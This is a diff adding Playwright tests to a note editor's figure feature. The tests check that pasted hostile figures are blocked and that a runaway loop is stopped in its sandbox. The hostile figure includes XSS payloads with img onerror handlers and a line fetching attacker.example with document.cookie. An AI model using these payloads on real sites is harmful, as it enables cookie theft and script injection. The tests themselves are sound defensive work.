@@ -6,7 +6,8 @@ interface EditorHandle {
   editor: {
     getJSON(): { content?: Array<{ type: string; attrs?: Record<string, unknown> }> };
     state: { doc: { descendants(f: (node: { type: { name: string } }, pos: number) => boolean | void): void }; selection: unknown };
-    commands: { setNodeSelection(pos: number): boolean; focus(): boolean; setTextSelection(pos: number): boolean };
+    commands: { setNodeSelection(pos: number): boolean; focus(position?: 'start' | 'end'): boolean; setTextSelection(pos: number): boolean };
+    getText(): string;
   };
   reopen(): void;
   scheduler(): { live: number; suspends: number; mounts: number; peakLive: number };
@@ -143,5 +144,113 @@ test.describe('figures in notes (Phase 4 gate)', () => {
     );
     expect(aspects!.length).toBeGreaterThan(0);
     for (const aspect of aspects!) expect(aspect).toBeGreaterThan(0.6);
+  });
+});
+
+/** Pastes a figure, as copied from another note or crafted by hand, at the end of the note. */
+async function pasteFigure(page: Page, attributes: Record<string, string>): Promise<void> {
+  await page.evaluate((attrs) => {
+    const { editor } = window.__playground as unknown as EditorHandle;
+    editor.commands.focus('end');
+    const element = document.createElement('figure');
+    element.setAttribute('data-incantly-figure', '');
+    for (const [name, value] of Object.entries(attrs)) element.setAttribute(name, value);
+    const data = new DataTransfer();
+    data.setData('text/html', element.outerHTML);
+    data.setData('text/plain', 'figure');
+    document.querySelector('.ProseMirror')!.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true }));
+  }, attributes);
+}
+
+const ATTACKER = 'attacker.example';
+
+test.describe('hostile figures in notes', () => {
+  test('a pasted figure is validated again before it runs, and hostile source never runs', async ({ page }) => {
+    const requests: string[] = [];
+    page.on('request', (request) => requests.push(request.url()));
+    await openNote(page, 'size=1');
+    await waitLive(page, 0);
+    const caption = `<img src="https://${ATTACKER}/caption" onerror="alert(1)">`;
+    await pasteFigure(page, {
+      'data-figure-id': 'fig-pasted',
+      'data-concept': 'stolen cookies',
+      'data-fragments': JSON.stringify({
+        html: `<div id='stage'></div><img src='https://${ATTACKER}/pixel' onerror='alert(1)'>`,
+        css: `#stage { background: url(https://${ATTACKER}/bg.png); }`,
+        js: `fetch('https://${ATTACKER}/steal?c=' + document.cookie);`,
+      }),
+      'data-description': caption,
+      'data-snapshot-ref': `https://${ATTACKER}/snapshot.png`,
+      'data-meta': JSON.stringify({ generationId: 'gen-1', prompt: 'the learner prompt', model: 'some-model' }),
+    });
+
+    const pasted = figure(page, 1);
+    await expect(pasted).toHaveAttribute('data-state', 'failed');
+    await expect(pasted).toContainText('This figure could not be shown. Its description is below.');
+    await expect(pasted.locator('iframe')).toHaveCount(0);
+    // The description is text, never markup.
+    await expect(pasted.locator('figcaption')).toHaveText(caption);
+    await expect(pasted.locator('figcaption img')).toHaveCount(0);
+
+    // Only what a note may record survives the paste.
+    const attrs = await page.evaluate(
+      () => (window.__playground as unknown as EditorHandle).editor.getJSON().content?.filter((n) => n.type === 'incantlyFigure')[1]?.attrs,
+    );
+    expect(attrs?.meta).toEqual({ generationId: 'gen-1' });
+    expect(attrs?.snapshotRef).toBeNull();
+    expect(attrs?.fragments).toMatchObject({ js: expect.stringContaining('fetch(') });
+
+    // The host hears why, once, with the failure kind and none of the source.
+    const reports = await page.evaluate(() => (window.__playground as unknown as { errors: unknown[] }).errors);
+    expect(reports).toEqual([
+      expect.objectContaining({
+        figureId: 'fig-pasted',
+        generationId: 'gen-1',
+        fatal: true,
+        error: expect.objectContaining({ phase: 'mount', message: expect.stringMatching(/did not pass validation \([\w-]+ in (html|css|js)\)/) }),
+      }),
+    ]);
+    expect(JSON.stringify(reports)).not.toContain(ATTACKER);
+
+    // The first figure is untouched, and nothing reached the attacker's host.
+    await expect(figure(page, 0)).toHaveAttribute('data-state', 'live');
+    await page.waitForTimeout(500);
+    expect(requests.filter((url) => url.includes(ATTACKER))).toEqual([]);
+  });
+
+  test('a pasted figure that never stops is stopped inside its sandbox and the note stays editable', async ({ page }) => {
+    await openNote(page, 'size=1');
+    await waitLive(page, 0);
+    await pasteFigure(page, {
+      'data-figure-id': 'fig-runaway',
+      'data-concept': 'endless list',
+      'data-fragments': JSON.stringify({
+        html: "<div id='stage'></div>",
+        css: '',
+        js: [
+          "const stage = inc.svg('#stage', { viewBox: [0, 0, 100, 100], title: 'List' });",
+          "stage.circle(50, 50, 4, { tone: 'lit' });",
+          'inc.onFrame(() => {',
+          '  const xs = [1];',
+          '  for (const x of xs) xs.push(x);',
+          '});',
+        ].join('\n'),
+      }),
+      'data-description': 'A list that never stops growing.',
+    });
+    const pasted = figure(page, 1);
+    // It passes validation and starts like any other figure. Its first frame, drawn once it is in view,
+    // runs out of fuel: the figure pauses and says so, and the controls stay alive (RT-7).
+    await expect(pasted).toHaveAttribute('data-state', 'live');
+    await pasted.scrollIntoViewIfNeeded();
+    await expect(frameOf(page, 1).getByRole('alert')).toHaveText(/hit a problem and paused/, { timeout: 8000 });
+    await expect.poll(() => page.evaluate(() => (window.__playground as unknown as { errors: Array<{ phase: string }> }).errors.map((e) => e.phase))).toContain('runaway');
+    await expect(figure(page, 0)).toHaveAttribute('data-state', 'live');
+
+    await page.evaluate(() => (window.__playground as unknown as EditorHandle).editor.commands.focus('end'));
+    await expect.poll(() => page.evaluate(() => document.activeElement?.classList.contains('ProseMirror'))).toBe(true);
+    await page.keyboard.press('Enter');
+    await page.keyboard.type('Still editable.');
+    await expect.poll(() => page.evaluate(() => (window.__playground as unknown as EditorHandle).editor.getText())).toContain('Still editable.');
   });
 });
